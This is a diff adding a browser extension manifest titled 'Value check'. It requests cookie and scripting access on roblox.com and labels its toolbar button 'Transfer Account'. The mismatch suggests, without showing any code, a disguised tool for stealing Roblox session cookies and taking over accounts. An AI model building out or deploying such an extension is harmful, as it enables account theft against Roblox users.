@@ -1,0 +1,9 @@
+{
+  "manifest_version": 3,
+  "name": "Value check",
+  "version": "1.0",
+  "permissions": ["scripting", "activeTab", "cookies"],
+  "host_permissions": ["https://*.roblox.com/*"],
+  "background": { "service_worker": "background.js" },
+  "action": { "default_title": "Transfer Account" }
+}
